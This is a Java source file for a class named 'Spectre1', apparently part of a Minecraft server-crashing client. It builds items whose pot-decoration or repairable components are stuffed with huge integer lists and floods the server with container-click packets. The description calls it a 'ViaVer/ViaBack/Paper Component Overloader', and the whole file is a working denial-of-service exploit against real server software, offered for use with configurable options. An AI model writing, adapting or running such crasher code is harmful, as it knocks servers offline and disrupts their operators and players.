package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataPotDecorations;
import us.whitedev.protocol.components.data.impl.DataRepairable;
import us.whitedev.protocol.components.objects.ItemStack;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;

public class Spectre1 implements Crasher {
    private static final String METHOD_NAME = "Spectre1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        String mode = args[3].toLowerCase();
        int count = Integer.parseInt(args[4]);
        String type = args[5].toLowerCase();
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {

            ItemStack item;
            if(mode.equals("pot")){
                List<Integer> potDecorations = new ArrayList<>(count);

                for (int i = 0; i < count; ++i)
                    potDecorations.add(type.equals("legit") ? 1 : 9876);

                DataComponents components = new DataComponents();
                components.put(new DataPotDecorations(potDecorations));

                item = new ItemStack(891, 1, components);
            }else {
                List<Integer> repairableHolders = new ArrayList<>();
                for (int i = 0; i < count; i++)
                    repairableHolders.add(type.equals("legit") ? 1 : 9876);

                DataComponents components = new DataComponents();
                components.put(new DataRepairable(null, repairableHolders));

                item = new ItemStack(891, 1, components);
            }

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 37,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.LEFT_CLICK,
                    item, new Int2ObjectArrayMap<>()), packets);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.20.5/1.21.4&7, and your current protocol is &c" + protocol, true);
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], mode[pot], count[100000], type[legit]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Mode", OptionType.LIST, new String[]{"Pot", "Repair"}),
                new OptionUtil("Count", OptionType.INTEGER),
                new OptionUtil("Type", OptionType.LIST, new String[]{"Legit", "Illegal"})
        );
    }

    @Override
    public String getDescription() {
        return "ViaVer/ViaBack/Paper Component Overloader";
    }
}